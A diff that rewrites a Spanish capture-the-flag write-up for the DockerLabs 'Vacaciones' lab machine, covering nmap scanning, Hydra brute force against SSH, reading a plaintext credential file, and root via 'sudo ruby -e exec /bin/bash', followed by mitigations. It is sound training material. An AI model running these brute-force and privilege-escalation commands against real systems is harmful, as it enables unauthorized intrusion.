@@ -1,97 +1,257 @@
-# Máquina Vacaciones #
+---
+title: Vacaciones
+description: Resolución de la máquina Vacaciones de DockerLabs
+---
 
-Hoy resolveré la máquina Vacaciones de la plataforma DockerLabs.
+# Vacaciones
 
-Temas a tratar:
+`DockerLabs` `Very Easy` `Linux` `Completada`
 
-- Reconocimiento
-- Fuerza bruta
-- Escalada de privilegios
+Máquina enfocada en inspección de código HTML, fuerza bruta contra SSH, movimiento entre usuarios y escalada de privilegios mediante Ruby ejecutado con sudo.
 
-## Paso 1 ##
+## Información de la máquina
 
-Activamos la máquina Vacaciones desde la terminal.
+| Campo | Valor |
+|---|---|
+| Plataforma | DockerLabs |
+| Dificultad | Very Easy |
+| Sistema operativo | Linux |
+| Estado | Completada |
+| Puertos principales | 22 y 80 |
+| Acceso inicial | SSH como camilo |
+| Movimiento lateral | Usuario juan |
+| Escalada de privilegios | Ruby mediante sudo |
 
-![Alt Imagen1](https://blogger.googleusercontent.com/img/a/AVvXsEhLEHN6wmvSOhsGlAZiMmBqbfMU7sM1YR1DtKG0ubJCQIoYHC-v5BeEM6BUqy1X2IAX0_BfaajGyjpu7w5TbfX6KMWaPp_84cg1SeAOQu3AAhPP220UkQ28LxhOpFlgOGfb1lMJvZyLbAwotg5tr5smdT9KWrhCQNZkPq9LC78BDsVymkZLgA9gomHi-TIX=w489-h174)
+## Técnicas utilizadas
 
-## Paso 2 ##
+`Nmap` `HTML` `SSH` `Hydra` `find` `Movimiento lateral` `Ruby` `Sudo`
 
-Realizamos un escaneo utlizando la herramienta **Nmap**
+## 1. Preparación de la máquina
 
-![Alt Imagen2](https://blogger.googleusercontent.com/img/a/AVvXsEixguKHadv4l5dMDMo-0ZflEd91uzP7oTnqJIyaOSvNvMp9S5HbO23mxkub8pqs3iWqXGEKzUnxlpxybrUfbUEEruDNStBMwkQMFd8gQgHBq0uUja5sBjTrOuI4vxdrOR6Xus7eu88lk_Ftwd96HD3ixMzX5wIeZT7o-BsaTNj8Hj5lP501q50tktN2QMi6=w604-h296)
+Se desplegó la máquina Vacaciones desde DockerLabs.
 
-- '-p- --open' = Escanea todos los puertos con el estado abierto
-- '-sS'= Es un escaneo SYN que evita que el Three-way handshake se complete
-- '--min-rate' = Envia paquetes no mas lentos que la cantidad que elijas
-- '-n' = Desactiva la resolicion DNS
-- '-Pn' = Toma todos los host como activos para evitar hacer ping a cada uno
-- '-vvv' = Muestra el proceso en pantalla mientras se va escaneando
-- 'oG' = Exporta tu escaneo en un formato grepeable para poder examinarlo mas adelante si se necesita
+<!-- IMAGEN PENDIENTE: despliegue de Vacaciones -->
 
-## Paso 3 ##
+## 2. Reconocimiento de puertos
 
-Interpretamos la información obtenida.
+```bash
+sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv <IP_OBJETIVO> -oG allPorts
+```
 
-Tenemos un solo puerto abierto:
+El escaneo mostró:
 
-- Puerto 22: En este puerto corre el servicio ssh
-- Puerto 80: En este puerto corre el servicio http
+| Puerto | Servicio | Estado |
+|---:|---|---|
+| 22/TCP | SSH | Abierto |
+| 80/TCP | HTTP | Abierto |
 
-## Paso 4 ##
+<!-- IMAGEN PENDIENTE: escaneo inicial -->
 
-Luego de identificar el puertos abierto que corre, debemos examinar mas a detalle como la versión y que servicio esta corriendo exactamente.
+## 3. Enumeración de servicios
 
-![Alt Imagen2](https://blogger.googleusercontent.com/img/a/AVvXsEgZknSZfSmx9LAvBsjKR42H6NxjSAOVNa6WpaVecc8ryDK_KsWW-DoXwIROCkWtQvF_pSNjVPaLIZ0_Q6MU2WPtvHuRj-dKvzvBrKON_l_G1DCDoag-sDabS-xTwVKgNdMYJ3gWmwrEaubDcN6JCB25OzwRahoECOMOa7pKHIBPB-WzKQstfpeVemay_Qpw=w488-h372)
+```bash
+sudo nmap -p 22,80 -sCV <IP_OBJETIVO> -oN targeted
+```
 
-- 'p-22,80' = Examina exactamente ese puerto.
-- '-sCV' = Lanza scripts basicos de reconocimiento y detecta la version de este.
+Se identificaron:
 
-## Paso 5 ##
+- OpenSSH 7.6p1.
+- Apache 2.4.29.
 
-Tenemos el servicio SSH con la version 7.6p1 y un servicio de apache corriendo en el puerto 80 con la version 2.4.29
+<!-- IMAGEN PENDIENTE: versiones encontradas -->
 
-Al entrar a la página web vemos que no hay nada, ni titulo ni contenido.
+## 4. Inspección de la página web
 
-![Alt Imagen3](https://blogger.googleusercontent.com/img/a/AVvXsEichJcq6JQITJPdhdnMLd591tGUcRsgMuVBziySZaMiQ1oDOi635esZIXLWHPGs_cg3kGMecAeVelotBRKyfmEhUqfnZnH5JEnXtReneBi6qYZ2JaCQunE8UFpNFFbjWhZZ1t36qxKix0pki2-Sob1EzoRj-AmgDnPS23KxFWouAqbMron2GCUJ2TJzNILl=w557-h256)
+La página web no mostraba contenido visible.
 
-Optamos por entrar a inspeccionar la página con la herramienta del mismo navegador y encontramos que había un comentario.
+Se revisó su código fuente desde el navegador:
 
-![Alt Imagen4](https://blogger.googleusercontent.com/img/a/AVvXsEiyCFSs1_VNaZ7RcyB3tcle6erOUOdrjQnNsDdTmyYSPHXLA0xGMjwhuMBrj5843fU8FCHvllHEFLlwuFPw_sJSWRvMcJOSe-xyae45BDVVYQE-SJsjpF-fM-kn9J93ooJqo1YxIOrFbakURArDkeIDVeDXq5QulmUACbhH56ODtj8QPSwDjr9dObyelCG2=w452-h319)
+```text
+Ctrl + U
+```
 
-Así logramos obtener dos posibles usuarios para poder realizar fuerza bruta al puerto 22.
+También puede consultarse desde la terminal:
 
-## Paso 6 ##
+```bash
+curl http://<IP_OBJETIVO>/
+```
 
-Ya teniendo el user 'camilo' y 'juan' podemos intentar realizar un ataque de fuerza bruta, utilizando hydra y la wordlist de rockyou.
+Dentro de un comentario HTML aparecieron dos posibles usuarios:
 
-![Alt Imagen5](https://blogger.googleusercontent.com/img/a/AVvXsEh2Tb9qszoDxijkj1M-i7Pb_Lc-Q9PBtySQlOW6NjJwC2t1RoGg-fz7q-gTx9_YWSqIvLM7gInaB1vnH7T2eo1JoitgwVa0TghmjfuEMWDFJUh0h4rhdaCgMhkJr3NcvoVhhb47ZFzmnGoAoZJWpKezs9BdPTs6eofU4Z99zN3rip4PbGIJC_uSABxhe7h2=w581-h205)
+```text
+camilo
+juan
+```
 
-Despues de ejecutar hydra con el wordlist de rockyou yel user camilo podemos encontrar la contraseña, la cual usaremos para obtener acceso mediante SSH.
+<!-- IMAGEN PENDIENTE: comentario HTML con usuarios -->
 
-![Alt Imagen6](https://blogger.googleusercontent.com/img/a/AVvXsEhw9RoJeeJd7EBz4jy0_JcviK_oAyg0wHV7DcvFuYgQbnRwVqNN9rX83gFWfnX7y6xUGPEN6zsN--qGhyhp1gqghR1KY51VDHpCm-4A_yVdew6J2bvoy1FJtLm0Bd5pPzWPXgoEpjUwW6Wj9-R9UtIU8vZ1zar6S8EEYwu877wqYUVvVaRbXdgi0wYMMD7f=w515-h122)
+## 5. Fuerza bruta contra SSH
 
-## Paso 7 ##
+Se probaron los usuarios encontrados mediante Hydra.
 
-Ya con el usuario camilo, tendremos que buscar vulnerabilidades para la escalada de privilegio.
+Para Camilo:
 
-Luego de una amplia búsqueda el usuario camilo estaba bastante limitado, pero Juan nos dejo un correo el cual pudimos leer buscando archivos .txt, dejandonos la contraseña de Juan.
+```bash
+hydra \
+    -l camilo \
+    -P /usr/share/wordlists/rockyou.txt \
+    ssh://<IP_OBJETIVO>
+```
 
-![Alt Imagen7](https://blogger.googleusercontent.com/img/a/AVvXsEjpQxC1fzMCoRW6HsbYXOvfUTq71nu-M2r3rBjc5VD62FylR4b62cm-kE0SUZ2LMl06vDUvJ_c8lmetqYWNfMvwVFXMhNBoNBdyXkpwR_M9UDpmAvlO67ZJbPRbpwG07GrXUwWeXCONkLGuGCpEpJ3iddcS9oFIGksuI8j3CqqbNYyDuUbA6unJd_Px8nzJ=w517-h325)
+La prueba encontró una contraseña válida para `camilo`.
 
-![Alt Imagen8](https://blogger.googleusercontent.com/img/a/AVvXsEhfepc_iWZ9uZHgWmvWHd81fyZe6lJRiNaIt-aB7R8p_yktvRxynbt1OhdYTdoL4ekv_upqmuiYgxXt_KGk6aOiSCp4WMT9gI5OqSEisJyjm-jAqUXliWxCEvI6fKswEYdzvqx4v0rZ9soUV_wbKGXK42Hr3Yt-r5iR5VmL9czHYJb5daYCK6GMFpRwUz7N)
+<!-- IMAGEN PENDIENTE: contraseña encontrada para camilo -->
 
-Ya con el usuario de Juan volvemos a buscar vulnerabilidades para la escalada de privilegio a usuario root.
+## 6. Acceso inicial
 
-![Alt Imagen9](https://blogger.googleusercontent.com/img/a/AVvXsEh4mHIkIBzHkFUBoOEzfDqkqBnYrQLZNcslKe3heXcGZeUBmustYucSCGl-iDcgdnMI6GFZtds7uNadPVkermBJLED2PLKBd8AmO18hxkkEAjbPqx98mAkCpjikOUFtuk0IwWIOPd3ACTvcThJWOeRAIUIAGcC4B83cbC04_zhULZSuAzCySPMoZaJAHNcW=w528-h99)
+Se inició sesión mediante SSH:
 
-Encontramos que podemos ejecutar ruby como root.
+```bash
+ssh camilo@<IP_OBJETIVO>
+```
 
-## Paso 8 ##
+Se comprobó la identidad:
 
-Procedemos a usar ruby como root, ejecutando código desde la misma terminal para poder correr una shells.
+```bash
+whoami
+id
+```
 
-![Alt Imagen10](https://blogger.googleusercontent.com/img/a/AVvXsEhTYOuUUGCfbvrNrZk469UZiBr2ErKSebNCQTCRj2K9Mly-_B6_1ij_OUscDFYWBpl-3uxC6YUTTdFfq8YE5-tywbGxOBCdnLD8VQh0YT1vU-GjV7lg2UC0Dz9_E-X27YsbbhINisT6de6HLBIAIN_osMN7wVvFm2P63mRIA3ANL58ksSmVXQ8Wbv97ln37=w446-h119)
+Resultado:
 
-Y asi, finalmente ya somos usuarios root, con los privilegios totales.
+```text
+camilo
+```
 
-Gracias por leer este WriteUp. :)
+## 7. Enumeración interna
+
+La cuenta de Camilo tenía permisos limitados.
+
+Se buscaron archivos de texto que pudieran contener mensajes o información:
+
+```bash
+find / -type f -name "*.txt" 2>/dev/null
+```
+
+También se revisaron archivos accesibles dentro de directorios de usuarios:
+
+```bash
+find /home -type f 2>/dev/null
+```
+
+Se encontró un mensaje dejado por Juan que contenía información para acceder a su cuenta.
+
+<!-- IMAGEN PENDIENTE: mensaje o correo encontrado -->
+
+## 8. Movimiento al usuario Juan
+
+Con la contraseña encontrada se cambió de usuario:
+
+```bash
+su juan
+```
+
+Después se comprobó la identidad:
+
+```bash
+whoami
+```
+
+Resultado:
+
+```text
+juan
+```
+
+<!-- IMAGEN PENDIENTE: acceso como juan -->
+
+## 9. Enumeración de privilegios
+
+Desde la cuenta de Juan se revisaron los permisos de sudo:
+
+```bash
+sudo -l
+```
+
+La configuración permitía ejecutar Ruby como `root`.
+
+Ruby puede ejecutar comandos del sistema, por lo que este permiso permite abrir una shell privilegiada.
+
+<!-- IMAGEN PENDIENTE: permiso sudo para Ruby -->
+
+## 10. Escalada mediante Ruby
+
+Se utilizó Ruby para ejecutar una shell:
+
+```bash
+sudo ruby -e 'exec "/bin/bash"'
+```
+
+Se comprobó la identidad final:
+
+```bash
+whoami
+```
+
+Resultado:
+
+```text
+root
+```
+
+También puede comprobarse con:
+
+```bash
+id
+```
+
+<!-- IMAGEN PENDIENTE: acceso final como root -->
+
+## 11. Vulnerabilidades encontradas
+
+### Usuarios expuestos en comentarios HTML
+
+El código fuente revelaba nombres de cuentas válidas del sistema.
+
+### Contraseña débil en SSH
+
+La contraseña de Camilo podía descubrirse mediante un ataque de diccionario.
+
+### Credenciales almacenadas en texto plano
+
+Un archivo accesible contenía información para ingresar como Juan.
+
+### Permisos sudo peligrosos
+
+Ruby podía ejecutarse como root y utilizarse para abrir una shell.
+
+## 12. Medidas de mitigación
+
+- Eliminar comentarios sensibles del código HTML.
+- No almacenar contraseñas en archivos de texto.
+- Aplicar permisos correctos en directorios y archivos personales.
+- Usar contraseñas largas, únicas y aleatorias.
+- Priorizar autenticación mediante claves SSH.
+- Implementar protección contra fuerza bruta.
+- No conceder permisos sudo a intérpretes como Ruby.
+- Aplicar el principio de mínimo privilegio.
+- Revisar periódicamente los permisos de sudo.
+- Supervisar accesos y cambios entre usuarios.
+
+## 13. Conclusión
+
+La resolución siguió este flujo:
+
+1. Escaneo de puertos.
+2. Enumeración de SSH y Apache.
+3. Inspección del código HTML.
+4. Descubrimiento de `camilo` y `juan`.
+5. Fuerza bruta contra la cuenta de Camilo.
+6. Acceso mediante SSH.
+7. Búsqueda de archivos internos.
+8. Obtención de credenciales de Juan.
+9. Movimiento lateral a Juan.
+10. Abuso de Ruby mediante sudo.
+11. Obtención de acceso como `root`.
+
+La vulnerabilidad principal fue la combinación de exposición de usuarios, credenciales débiles, almacenamiento inseguro de contraseñas y permisos sudo excesivos.
